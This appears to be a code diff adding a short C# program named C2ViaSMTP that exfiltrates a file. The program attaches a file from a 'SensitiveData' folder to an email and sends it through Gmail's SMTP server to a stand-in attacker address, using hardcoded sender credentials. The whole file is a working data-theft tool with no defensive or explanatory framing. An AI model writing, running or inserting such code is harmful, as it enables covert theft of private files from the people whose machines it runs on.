@@ -1,0 +1,46 @@
+using System;
+using System.IO;
+using System.Net;
+using System.Net.Mail;
+
+class C2ViaSMTP
+{
+    static void Main()
+    {
+        // Target file exfiltrate
+        string targetFilePath = @"C:\SensitiveData\report.pdf";
+        string emailRecipient = "attacker@example.com";
+        string attackerEmail = "malwarebot@gmail.com";
+        string attackerPassword = "maliciouspassword123";
+
+        try
+        {
+            // Send data as a email message
+            MailMessage message = new MailMessage();
+            message.From = new MailAddress(attackerEmail);
+            message.To.Add(emailRecipient);
+            message.Subject = "Exfiltrated Data";
+            message.Body = "Attached file contains sensitive exfiltrated data.";
+            
+            // Add target file as attachment
+            Attachment attachment = new Attachment(targetFilePath);
+            message.Attachments.Add(attachment);
+
+            // Configure SMTP client
+            SmtpClient smtpClient = new SmtpClient("smtp.gmail.com")
+            {
+                Port = 587,
+                Credentials = new NetworkCredential(attackerEmail, attackerPassword),
+                EnableSsl = true
+            };
+
+            // Send email
+            smtpClient.Send(message);
+            Console.WriteLine("Data exfiltration email sent successfully.");
+        }
+        catch (Exception ex)
+        {
+            Console.WriteLine("Error: " + ex.Message);
+        }
+    }
+}
